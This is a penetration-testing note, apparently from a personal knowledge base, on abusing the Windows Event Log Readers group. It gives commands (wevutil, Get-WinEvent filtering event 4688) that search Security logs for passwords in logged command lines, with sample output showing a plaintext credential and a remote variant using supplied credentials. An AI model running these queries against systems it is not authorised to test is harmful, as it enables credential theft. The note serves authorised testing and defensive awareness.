---
Primary_category: ""
title: ""
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS SECURITY GROUPS|SECURITY GROUPS]]

#### *Theory*

Any user account belonging to this built-in group has read permissions over the local system events, which means that it can review and analyze system events without granting any administrative privileges

---

#### *Enumeration*

##### *Listing the Groups to which the Current User belongs*

```bash
whoami /groups
net user <USER>
```

##### *Members of Event Log Readers*

```bash
net localgroup "Event Log Readers"
```

---

#### *Information Disclosure on Event Logs*

##### *Requirements*

- ***The controlled user account must be a member of the Event Log Readers built-in group***

- ***[Auditing of Process Creation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-process-creation) and corresponding command line values is enabled ( e.g. Process Command Line Logging )***

##### *Abuse*

Let's suppose we are assessing a company that has its own *blue team* and, as a result, has implemented a series of monitoring measures to detect any type of initial breach

To do so, it has enabled *Auditing of Process Creation*, so it can detect any binary that is being executed from the *domain-joined* machines

It would seem suspicious to receive a message indicating that a **`whoami`** and a **`tasksvc`** command have been executed from a marketing workstation

Now let's imagine we compromise a domain user account which belongs to the *Event Log Readers* group of a given *domain-joined* machine

Since the mentioned features are enabled, most executed commands are logged, so there is a chance to gather interesting information from the command line execution by retrieving all logs that match a certain filter

###### *Searching Security Logs*

> ***From the target*** 🎯

> ***Wevutil***

```bash
wevutil qe Security /rd:true /f:text | Select-String "/user"
```

> [!NOTE]- *Command Output*
>
> ```bash
> Process Command Line:   net use T: \\shared\stuff /user:john.doe password1234$!
> ```
>

> ***Get-WinEvent***

> ***4688 ID → "A new process has been created"***

```bash
Get-WinEvent -LogName Security | ? { $_.ID -eq 4688 -and $_.Properties[8].Value -match '.*(pass|user|pwd|key).*'} | % { $_.Properties[8].Value }
```

> [!NOTE]- *Command Output*
>
> ```bash
> net use T: \\smb01\stuff /user:john.doe password1234$!
> ```
>

- ***Alternative Credentials***

If we are not able to log in to the target and issue the command above, we can proceed as follows in order to establish a remote connection to the target and query the existing events as the controlled user account by providing alternative credentials

```bash
wevutil qe Security /rd:true /f:text /r:<TARGET> /u:<USER> /p:<PASSWD> | findstr /I '/user'
```

